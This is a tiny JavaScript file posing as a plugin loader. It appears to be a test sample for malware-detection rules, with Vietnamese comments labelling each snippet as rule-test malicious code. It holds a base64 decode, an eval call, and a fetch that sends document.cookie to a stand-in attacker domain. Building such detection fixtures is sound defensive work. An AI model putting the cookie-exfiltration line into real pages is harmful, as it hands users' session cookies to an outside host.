console.log("Loading plugin...");

// Đoạn mã độc thử nghiệm theo luật: Giải mã base64
var token = atob("c2VjcmV0X3Bhc3N3b3Jk");

// Đoạn mã độc thử nghiệm theo luật: eval / new Function
eval("console.log('Malicious payload executed: ' + token)");

// Đoạn mã độc thử nghiệm theo luật: Gọi URL bên ngoài
fetch("https://attacker-malicious-domain.com/collect?cookie=" + document.cookie);
